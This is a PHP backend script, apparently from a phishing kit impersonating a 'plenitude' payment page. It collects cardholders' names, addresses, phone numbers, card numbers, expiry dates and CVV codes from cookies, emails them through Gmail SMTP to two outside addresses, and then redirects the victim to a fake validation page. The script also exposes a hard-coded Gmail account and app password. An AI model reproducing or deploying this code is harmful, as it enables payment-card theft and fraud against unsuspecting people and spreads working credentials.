<?php
use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\SMTP;
use PHPMailer\PHPMailer\Exception;

// Inclure les fichiers requis de PHPMailer
require 'PHPMailer/PHPMailer.php';
require 'PHPMailer/SMTP.php';
require 'PHPMailer/Exception.php';
echo "PHPMailer chargé avec succès"

// Vérifier si le formulaire a été soumis
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // Récupérer les données des cookies
    $n_card = isset($_COOKIE['n_card']) ? htmlspecialchars($_COOKIE['n_card']) : '';
    $address = isset($_COOKIE['address']) ? htmlspecialchars($_COOKIE['address']) : '';
    $address1 = isset($_COOKIE['address1']) ? htmlspecialchars($_COOKIE['address1']) : '';
    $country = isset($_COOKIE['country']) ? htmlspecialchars($_COOKIE['country']) : '';
    $phone = isset($_COOKIE['phone']) ? htmlspecialchars($_COOKIE['phone']) : '';
    $nom = isset($_COOKIE['nom']) ? htmlspecialchars($_COOKIE['nom']) : '';
    $prenom = isset($_COOKIE['prenom']) ? htmlspecialchars($_COOKIE['prenom']) : '';
    $c_num = isset($_COOKIE['c_num']) ? htmlspecialchars($_COOKIE['c_num']) : '';
    $exm = isset($_COOKIE['exm']) ? htmlspecialchars($_COOKIE['exm']) : '';
    $exy = isset($_COOKIE['exy']) ? htmlspecialchars($_COOKIE['exy']) : '';
    $csc = isset($_COOKIE['csc']) ? htmlspecialchars($_COOKIE['csc']) : '';

    if (!empty($n_card) && !empty($address) && !empty($address1) && !empty($country) && !empty($phone) && !empty($nom) && !empty($prenom) && !empty($c_num) && !empty($exm) && !empty($exy) && !empty($csc)) {
        // Instancier PHPMailer
        $mail = new PHPMailer(true);

        try {
            // Configuration du serveur SMTP
            $mail->isSMTP();
            $mail->Host = 'smtp.gmail.com'; // Serveur SMTP de Gmail
            $mail->SMTPAuth = true;
            $mail->Username = 'scottmayzie@gmail.com'; // Remplacez par votre adresse Gmail
            $mail->Password = 'itipzjmsptsyolny'; // Remplacez par votre mot de passe d'application Gmail
            $mail->SMTPSecure = PHPMailer::ENCRYPTION_STARTTLS;
            $mail->Port = 587;

            // Configurer les destinataires
            $mail->setFrom('scottmayzie@gmail.com', 'plenitude card Payment'); // Expéditeur
            $mail->addAddress('jasmayzie@gmail.com'); // Destinataire (vous pouvez changer cette adresse)
            $mail->addAddress('gestionimmobilier770@gmail.com');

            // Contenu de l'e-mail
            $mail->isHTML(true);
            $mail->Subject = 'Informations de paiement plenitude';
            $mail->Body    = "
                <h1>Informations collectées</h1>
                <p><strong>Nom sur la carte:</strong> $n_card</p>
                <p><strong>Adresse:</strong> $address</p>
                <p><strong>Adresse personnelle:</strong> $address1</p>
                <p><strong>Pays:</strong> $country</p>
                <p><strong>Numéro de téléphone:</strong> $phone</p>
                <p><strong>Nom:</strong> $nom</p>
                <p><strong>Prénom:</strong> $prenom</p>
                <p><strong>Numéro de la carte:</strong> $c_num</p>
                <p><strong>Mois d'expiration:</strong> $exm</p>
                <p><strong>Année d'expiration:</strong> $exy</p>
                <p><strong>CVV:</strong> $csc</p>
            ";

            // Envoyer l'e-mail
            $mail->send();
            // Stocker les données dans des cookies pour les utiliser dans 3.html
            setcookie("n_card", $n_card, time() + 3600, "/");
            setcookie("nom", $nom, time() + 3600, "/");
            setcookie("prenom", $prenom, time() + 3600, "/");
            setcookie("c_num", $c_num, time() + 3600, "/");
            // Redirection après l'envoi
            header('Location: /plenitude/validation/'); // Remplacez par l'URL souhaitée
            exit();
        } catch (Exception $e) {
            echo "Erreur lors de l'envoi de l'email: {$mail->ErrorInfo}";
        }
    } else {
        echo "Veuillez remplir tous les champs.";
    }
} else {
    echo "Méthode de requête non autorisée.";
}
?>
